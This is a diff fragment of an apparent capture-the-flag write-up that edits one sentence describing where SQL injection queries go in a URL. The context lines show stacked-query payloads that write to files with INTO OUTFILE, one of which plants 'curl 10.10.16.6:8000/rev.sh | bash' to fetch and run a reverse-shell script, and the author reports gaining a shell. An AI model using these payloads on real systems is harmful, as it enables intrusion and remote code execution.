@@ -248,7 +248,7 @@ aa&o=ASC%3b+select+"TEST"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
 
 aa&o=ASC%3b+select+"curl+10.10.16.6:8000/rev.sh+|bash%3b"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b
 
-I put those into the url, right after the "?s=" string
+I put my urlencoded queries into the url, right after the "?s=" bit
 ```
 
 After an ungodly amount of troubleshooting these two queries, I got a shell as the mysql user!
